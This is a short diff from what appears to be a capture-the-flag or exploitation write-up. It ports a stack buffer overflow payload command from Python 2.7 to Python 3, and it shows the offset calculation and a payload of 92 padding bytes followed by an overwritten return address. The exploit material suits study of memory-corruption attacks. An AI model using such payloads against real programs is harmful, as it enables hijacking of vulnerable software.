@@ -33,5 +33,5 @@ size_t i, len;                                  // 16 bytes (8 each one)
 Sum that up and add another 4 for `ebp` => 92
 
 ``` Bash
-python2.7 -c 'print "100\n" + "A" * 92 + "\x96\x85\x04\x08"' > payload
+python3 -c 'import sys; sys.stdout.buffer.write(b"100\n" + b"A" * 92 + b"\x96\x85\x04\x08")' > payload
 ```
